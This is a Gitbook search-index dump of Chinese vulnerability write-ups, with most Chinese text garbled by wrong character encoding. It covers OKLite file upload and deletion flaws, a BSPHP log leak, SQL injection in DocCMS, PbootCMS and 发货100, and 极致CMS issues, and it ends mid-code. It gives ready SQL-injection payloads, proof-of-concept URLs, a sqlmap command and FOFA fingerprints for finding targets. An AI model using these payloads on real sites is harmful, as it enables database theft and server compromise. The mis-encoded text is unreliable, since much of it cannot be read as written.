‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131.html","title":"OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131","keywords":"","body":"OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131 ÊºèÊ¥ûÊèèËø∞ OKLite v1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ•ËøáÊª§‰∏çÂÆåÂñÑÂØºËá¥ÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊú®È©¨Êñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OKLite 1.2.25 ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖàË¶ÅÂÖàÊ∏ÖÊ•öÂÆÉÁöÑÊâßË°åÊµÅÁ®ã Êü•ÁúãÊñá‰ª∂ framework/init.php Âú®ÂæÄ‰∏ãÈù¢ÁúãÂèØ‰ª•ÁúãÂà∞ÊâßË°åÂáΩÊï∞ÁöÑÈÄªËæë ‰æãÂ¶Ç http://127.0.0.1/admin.php?c=ABC&f=EFG ÂàôÊòØË∞ÉÁî® framework\\admin\\ABC_control.php‰∏≠ÁöÑEFG_fÊñπÊ≥ï ÁúãÂà∞Âú®ÂêéÂè∞Êúâ‰∏Ä‰∏™ ZIP Êñá‰ª∂‰∏ä‰º†ÁöÑÂáΩÊï∞ÔºåÊâæ‰∏Ä‰∏ã‰∏ä‰º†ZIPÊñá‰ª∂ÁöÑ‰ΩçÁΩÆ Ê®°ÂùóÁÆ°ÁêÜ --> Ê®°ÂùóÂØºÂÖ• ÂõûÂ§¥Áúã‰∏ãÂáΩÊï∞ÊñπÊ≥ïÁöÑË∞ÉÁî® public function zipfile($input,$folder='') { if(!$input){ return array('status'=>'error','content'=>P_Lang('Êú™ÊåáÂÆöË°®ÂçïÂêçÁß∞')); } //Â¶ÇÊûúÊú™ÊåáÂÆöÂ≠òÂÇ®Êñá‰ª∂Â§πÔºåÂàô‰ΩøÁî® if(!$folder){ $folder = 'data/cache/'; } $this->cateid = 0; $this->set_dir($folder); $this->set_type('zip'); $this->cate = array('id'=>0,'filemax'=>104857600,'root'=>$folder,'folder'=>'/','filetypes'=>'zip'); if(isset($_FILES[$input])){ $rs = $this->_upload($input); }else{ $rs = $this->_save($input); } if($rs['status'] != 'ok'){ return $rs; } $rs['cate'] = $this->cate; return $rs; } ËøôÈáåÁöÑ ‰∏ä‰º†ÁõÆÂΩïÈªòËÆ§‰∏∫ data/cache Ëøô‰∏™ÁõÆÂΩïÔºåÂπ∂Ë∞ÉÁî®‰∫Ü‰∏§‰∏™ÊñπÊ≥ï _upload Âíå _save ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂÖ∂ÂÆûÂØπ‰∏ä‰º†ÁöÑzipÂπ∂Ê≤°ÊúâÂØπÈáåÈù¢ÁöÑÊñá‰ª∂Êúâ‰ªÄ‰πàËøáÊª§,‰ªªÊÑè‰∏ä‰º†‰∏Ä‰∏™ZIPÊñá‰ª∂ÊäìÂåÖ test.phpÊñá‰ª∂ÂÜÖÂÆπ Â¶Ç‰∏ãÔºåÊâìÂåÖ‰∏∫ test.zip ‰∏ä‰º† ÂèØ‰ª•ÁúãÂà∞ËøôÈáåË∞ÉÁî®ÁöÑÊñπÊ≥ïÊòØ upload_control‰∏≠ÁöÑ zip ÊñπÊ≥ï ËøôÈáåÊîæÂåÖÂêéÂèëÁé∞Ë∞ÉÁî®‰∫ÜÂè¶‰∏Ä‰∏™ÊñπÊ≥ïÔºåË∑üË∏™‰∏ã‰ª£Á†Å framework/admin/module_control.php ‰∏≠ÁöÑ import_fÊñπÊ≥ï ËøôÈáåÁöÑÊñπÊ≥ï‰∏∫Ëß£ÂéãÊñπÊ≥ïÔºåËØ¥ÊòéZIPÊñá‰ª∂‰∏ä‰º†ÁöÑÈÄªËæë‰∏∫ Ê®°Âùó‰∏ä‰º† --> ZIPÊñá‰ª∂ÂÜôÂÖ• data/cache --> Ëß£ÂéãÂàöÂàöÁöÑZIPÊñá‰ª∂Âà∞ data/cache ÁõÆÂΩï ÊâÄ‰ª•ËøôÈáåÁöÑÊµÅÁ®ãÂÆåÂÖ®ÊòØÊ≤°ÊúâËøáÊª§Âç±Èô©Êñá‰ª∂ÁöÑÔºåÂ∞Ü‰∏Ä‰∏™Êú®È©¨Êñá‰ª∂ÊâìÂåÖ‰∏∫ZIPÊñá‰ª∂‰∏ä‰º†ËÆøÈóÆÂç≥ÂèØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞Êèí‰ª∂ÂÆâË£Ö ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞Êèí‰ª∂ÂÆâË£Ö ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"OKLite 1.2.25 ÂêéÂè∞Êèí‰ª∂ÂÆâË£Ö ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†","keywords":"","body":"OKLite 1.2.25 ÂêéÂè∞Êèí‰ª∂ÂÆâË£Ö ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† ÊºèÊ¥ûÊèèËø∞ OKLite v1.2.25 ÂêéÂè∞Êèí‰ª∂ËøáÊª§‰∏çÂÆåÂñÑÂØºËá¥ÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊú®È©¨Êñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OKLite 1.2.25 ÊºèÊ¥ûÂ§çÁé∞ ÂÖ≥‰∫éÊâßË°åÈÄªËæëÂèÇÁÖß‰∏ä‰∏ÄÁØá OKLite 1.2.25 ÂêéÂè∞Ê®°ÂùóÂØºÂÖ• ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º† CVE-2019-16131 Âá∫Áé∞ÊºèÊ¥ûÁöÑ‰ΩçÁΩÆÂú®‰∫éframework/admin/plugin_control.php public function unzip_f() { $id = $this->get('id','int'); $rs = $this->model('res')->get_one($id); if(!$rs){ $this->json(P_Lang('ÈôÑ‰ª∂‰∏çÂ≠òÂú®')); } if($rs['ext'] != 'zip'){ $this->json(P_Lang('ÈùûZIPÊñá‰ª∂‰∏çÊîØÊåÅÂú®Á∫øËß£Âéã')); } if(!file_exists($this->dir_root.$rs['filename'])){ $this->json(P_Lang('Êñá‰ª∂‰∏çÂ≠òÂú®')); } $info = $this->lib('phpzip')->zip_info($this->dir_root.$rs['filename']); $info = current($info); if(!$info['filename']){ $this->json(P_Lang('Êèí‰ª∂ÊúâÂºÇÂ∏∏')); } $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('Êèí‰ª∂ÊúâÂºÇÂ∏∏')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('Êèí‰ª∂Â∑≤Â≠òÂú®Ôºå‰∏çÂÖÅËÆ∏ÈáçÂ§çËß£Âéã')); } if(!$info[1]){ $this->json(P_Lang('Êèí‰ª∂ÊâìÂåÖÊ®°ÂºèÊúâÈóÆÈ¢ò')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); } ËøôÈáåÂèØ‰ª•ÁúãÂà∞ÈúÄË¶Å‰∏ä‰º†ZIPÂéãÁº©ÂåÖÊ†ºÂºèÁöÑÊèí‰ª∂ÔºåË∑üËøõzip_infoÂáΩÊï∞ ÂáΩÊï∞‰ΩçÁΩÆ framework/libs/phpzip.php ËøôÈáå‰ºöËøîÂõûÂÖ≥‰∫éZIPÂéãÁº©ÂåÖÁöÑ‰∏Ä‰∫õ‰ø°ÊÅØ ÂæÄ‰∏ãÁúãÂÖ≥ÈîÆ‰ΩçÁΩÆ $info = explode('/',$info['filename']); if(!$info[0]){ $this->json(P_Lang('Êèí‰ª∂ÊúâÂºÇÂ∏∏')); } if(file_exists($this->dir_root.'plugins/'.$info[0])){ $this->json(P_Lang('Êèí‰ª∂Â∑≤Â≠òÂú®Ôºå‰∏çÂÖÅËÆ∏ÈáçÂ§çËß£Âéã')); } if(!$info[1]){ $this->json(P_Lang('Êèí‰ª∂ÊâìÂåÖÊ®°ÂºèÊúâÈóÆÈ¢ò')); } $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); ËøôÈáåÁî® explodeÂáΩÊï∞‰ª• / ÂàÜÈöîËøîÂõû‰∏§‰∏™ÂÄºÔºå‰πüÂ∞±ÊòØËØ¥Ê†ºÂºèÂ∫î‰∏∫ AAA/BBBËøôÊ†∑ÁöÑÁõÆÂΩïÊ†ºÂºèÔºåÁõ¥Êé•‰∏ä‰º†ZIPÊñá‰ª∂Âàô‰ºöÊä•Èîô Êèí‰ª∂ÊâìÂåÖÊ®°ÂºèÊúâÈóÆÈ¢ò Âú®ËøôÈáå‰∏ä‰º†‰∏Ä‰∏™ZIPÊñá‰ª∂ÔºåÊ†ºÂºèË¶ÅÊòØËß£ÂéãÂá∫Êù•‰∏∫ÁõÆÂΩïÔºåÁõÆÂΩï‰∏≠Âê´PHPÊñá‰ª∂Â∞±Ë°å‰∫Ü $this->lib('phpzip')->unzip($this->dir_root.$rs['filename'],$this->dir_root.'plugins/'); $this->json(true); ÊúÄÂêé‰∏§Ë°åÂëäËØâ‰∫ÜÊñá‰ª∂Ëß£ÂéãÁöÑ‰ΩçÁΩÆÔºå‰∏ä‰º†ÁöÑÊñá‰ª∂Âú® pluginsÁõÆÂΩï‰∏ã Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ CVE-2019-16132.html":{"url":"book/CMSÊºèÊ¥û/OKLite/OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ CVE-2019-16132.html","title":"OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ CVE-2019-16132","keywords":"","body":"OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°Âùó ‰ªªÊÑèÊñá‰ª∂Âà†Èô§ CVE-2019-16132 ÊºèÊ¥ûÊèèËø∞ OKLite 1.2.25 ÂêéÂè∞È£éÊ†ºÊ®°ÂùóÂ≠òÂú® ÂØπÂç±Èô©Â≠óÁ¨¶Êú™ËøáÊª§ÔºåÂØºËá¥ÂèØ‰ª•Âà†Èô§‰ªªÊÑèÁõÆÂΩïÂíåÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OKLite 1.2.25 ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÂáΩÊï∞Âú®Êñá‰ª∂ framework/admin/tpl_control.php ‰∏≠ÁöÑ delfile_f() ÂáΩÊï∞ ËøôÈáåÂà†Èô§Êñá‰ª∂‰∏ªË¶ÅË∞ÉÁî®‰∫Ü rmÂáΩÊï∞, ‰ΩçÁΩÆÂú® framework/libs/file.php /** * Âà†Èô§Êìç‰ΩúÔºåËØ∑‰∏ÄÂÆöË¶ÅÂ∞èÂøÉÔºåÂú®Á®ãÂ∫è‰∏≠ÊúÄÂ•Ω‰∏•Ê†º‰∏Ä‰∫õÔºå‰∏çÁÑ∂ÊúâÂèØËÉΩÂ∞ÜÊï¥‰∏™ÁõÆÂΩïÂà†Êéâ * @ÂèÇÊï∞ $del Ë¶ÅÂà†Èô§ÁöÑÊñá‰ª∂ÊàñÊñá‰ª∂Â§π * @ÂèÇÊï∞ $type ‰ªÖÊîØÊåÅfileÂíåfolderÔºå‰∏∫fileÊó∂‰ªÖÂà†Èô§$delÊñá‰ª∂ÔºåÂ¶ÇÊûú$del‰∏∫Êñá‰ª∂Â§πÔºåË°®Á§∫Âà†Èô§ÂÖ∂‰∏ãÈù¢ÁöÑÊñá‰ª∂„ÄÇ‰∏∫folderÊó∂ÔºåË°®Á§∫Âà†Èô§$delËøô‰∏™Êñá‰ª∂ÔºåÂ¶ÇÊûú‰∏∫Êñá‰ª∂Â§πÔºåË°®Á§∫Âà†Èô§Ê≠§Êñá‰ª∂Â§πÂèäÂ≠êÈ°π * @ËøîÂõû true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } ËøôÈáåÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞ÈÅçÂéÜÔºåËé∑ÂæóÁöÑÊñá‰ª∂ÂêçÊàñÊñá‰ª∂Â§πËøõË°åÂà†Èô§ ÂõûËøáÂ§¥Áúã Ë∞ÉÁî®getÂáΩÊï∞‰º†ÂÖ•ÂèÇÊï∞Êó∂ÊòØÂê¶ÊúâÂØπ ../ ÁöÑËøáÊª§ ÂèØ‰ª•ÁúãÂà∞ÂèÇÊï∞Êàë‰ª¨ÊòØÂèØÊéßÁöÑÔºå‰ΩøÁî®ËøôÈáåÁöÑÊºèÊ¥ûËøõË°å‰ªªÊÑèÊñá‰ª∂Âà†Èô§ ÊäìÂåÖ‰øÆÊîπÊàêÂäüÂà†Èô§Êñá‰ª∂ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/BSPHP/":{"url":"book/CMSÊºèÊ¥û/BSPHP/","title":"BSPHP","keywords":"","body":"BSPHP BSPHP Êú™ÊéàÊùÉËÆøÈóÆ ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/BSPHP/BSPHP Êú™ÊéàÊùÉËÆøÈóÆ ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/BSPHP/BSPHP Êú™ÊéàÊùÉËÆøÈóÆ ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"BSPHP Êú™ÊéàÊùÉËÆøÈóÆ ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"BSPHP Êú™ÊéàÊùÉËÆøÈóÆ ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ BSPHP Â≠òÂú®Êú™ÊéàÊùÉËÆøÈóÆ Ê≥ÑÈú≤Áî®Êà∑ IP Âíå Ë¥¶Êà∑Âêç‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] BSPHP FOFA [!NOTE] \"BSPHP\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÂ¶Ç‰∏ãURLÔºåÊ≥ÑÈú≤Áî®Êà∑Âêç‰∏éÁôªÂΩïIP http://xxx.xxx.xxx.xxx/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‚Äò Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/DocCMS/":{"url":"book/CMSÊºèÊ¥û/DocCMS/","title":"DocCMS","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/DocCMS/DocCMS keyword SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/DocCMS/DocCMS keyword SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"DocCMS keyword SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"DocCMS keyword SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ DocCMS keywordÂèÇÊï∞Â≠òÂú® SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] DocCMS FOFA [!NOTE] app=\"Doccms\" ÊºèÊ¥ûÂ§çÁé∞ CMSÂÆòÁΩë È™åËØÅPOC /search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33 ÂÖ∂‰∏≠payload‰∏∫‰∏ãÂàóËØ≠Âè•ÁöÑ‰∫åÊ¨°UrlÁºñÁ†Å ' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))# Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/PbootCMS/":{"url":"book/CMSÊºèÊ¥û/PbootCMS/","title":"PbootCMS","keywords":"","body":"PbootCMS PbootCMS search SQLÊ≥®ÂÖ•ÊºèÊ¥û PbootCMS ext_price SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/PbootCMS/PbootCMS search SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/PbootCMS/PbootCMS search SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"PbootCMS search SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"PbootCMS search SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ PbootCMS ÊêúÁ¥¢Ê®°ÂùóÂ≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇÈÄöËøáÊºèÊ¥ûÂèØËé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" ÊºèÊ¥ûÂ§çÁé∞ ÊêúÁ¥¢Ê°ÜÈ°µÈù¢‰∏∫ Payload‰∏∫ /index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/PbootCMS/PbootCMS ext_price SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/CMSÊºèÊ¥û/PbootCMS/PbootCMS ext_price SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"PbootCMS ext_price SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"PbootCMS ext_price SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ PbootCMS Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇÈÄöËøáÊºèÊ¥ûÂèØËé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] PbootCMS FOFA [!NOTE] app=\"PBOOTCMS\" ÊºèÊ¥ûÂ§çÁé∞ ‰∏ªÈ°µ ÊµãËØï Payload /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂèëË¥ß100/":{"url":"book/CMSÊºèÊ¥û/ÂèëË¥ß100/","title":"ÂèëË¥ß100","keywords":"","body":"ÂèëË¥ß100 ÂèëË¥ß100 M_id SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-30193 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÂèëË¥ß100/ÂèëË¥ß100 M_id SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-30193.html":{"url":"book/CMSÊºèÊ¥û/ÂèëË¥ß100/ÂèëË¥ß100 M_id SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-30193.html","title":"ÂèëË¥ß100 M_id SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-30193","keywords":"","body":"ÂèëË¥ß100 M_id SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-30193 ÊºèÊ¥ûÊèèËø∞ ÂèëË¥ß100 M_idÂèÇÊï∞Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºå ÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂèëË¥ß100 FOFA [!NOTE] icon_hash=\"1420424513\" ÊºèÊ¥ûÂ§çÁé∞ ‰∏ªÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®POC /?M_id=1%27&type=product Êï∞ÊçÆÂ∫ìÂá∫Áé∞Êä•Èîô, ‰ΩøÁî®SqlmapÊ≥®ÂÖ• sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27&type=product' -p M_id Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/":{"url":"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/","title":"ÊûÅËá¥CMS","keywords":"","body":"ÊûÅËá¥CMS ÊûÅËá¥CMS ÂÖ®ÁâàÊú¨‰ªªÊÑè‰ª£Á†ÅÊâßË°å(ÂêéÂè∞ÊùÉÈôê) ÊûÅËá¥CMS 1.71 ,1.7 ,1.67 ÁâàÊú¨ ÊîØ‰ªòÊèí‰ª∂sqlÊ≥®ÂÖ• ÊûÅËá¥CMS Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS_ÂÖ®ÁâàÊú¨‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html":{"url":"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS_ÂÖ®ÁâàÊú¨‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.html","title":"ÊûÅËá¥CMS ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†(ÂêéÂè∞ÊùÉÈôê)","keywords":"","body":"ÊûÅËá¥CMS_ÂÖ®ÁâàÊú¨‰ªªÊÑèÊñá‰ª∂(ÂêéÂè∞) ÁôªÈôÜÂêéÂè∞Êü•ÁúãÊèí‰ª∂Â§ÑÔºåÊúâ‰∏Ä‰∏™ÂêéÂè∞ÁºñËæëÁöÑÊèí‰ª∂ ÂÆâË£Ö‰πãÂêéËÆæÁΩÆÂØÜÁ†ÅÂπ∂‰ΩøÁî® [!NOTE] Â¶ÇÊûúÂ∑≤ÁªèËÆæÊúâÂØÜÁ†ÅÔºåÈáçÊñ∞ÂÆâË£ÖÊèí‰ª∂Âç≥ÂèØËß£ÂÜ≥ÂØÜÁ†ÅÊú™Áü•ÈóÆÈ¢ò ‰øÆÊîπ‰∏∫php‰ª£Á†Å ÊàêÂäüÊâßË°åphp‰ª£Á†ÅÁöÑÂëΩ‰ª§ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS_1.71_1.7_1.67ÁâàÊú¨sqlÊ≥®ÂÖ•.html":{"url":"book/CMSÊºèÊ¥û/ÊûÅËá¥CMS/ÊûÅËá¥CMS_1.71_1.7_1.67ÁâàÊú¨sqlÊ≥®ÂÖ•.html","title":"ÊûÅËá¥CMS 1.71 + 1.7 + 1.67 ÁâàÊú¨sqlÊ≥®ÂÖ•","keywords":"","body":"ÊûÅËá¥CMS_1.71_1.7_1.67ÁâàÊú¨sqlÊ≥®ÂÖ•(ÊîØ‰ªòÊèí‰ª∂) Êü•Áúã‰∏Ä‰∏ãËøõË°åËøáÊª§ÁöÑÂáΩÊï∞ /** ÂèÇÊï∞ËøáÊª§ÔºåÊ†ºÂºèÂåñ **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://Êï¥Êï∞ return (int)$value; case 1://Â≠óÁ¨¶‰∏≤ $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://Êï∞ÁªÑ if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://ÊµÆÁÇπ return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //ËøáÊª§XSSÊîªÂáª function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //Âà†Èô§ÈùûÊâìÂç∞Â≠óÁ¨¶ÔºåÁ≤óÊö¥ÂºèËøáÊª§xssÂèØÁñëÂ≠óÁ¨¶‰∏≤ $arr[$key] = htmlentities(strip_tags($value)); //ÂéªÈô§ HTML Âíå PHP 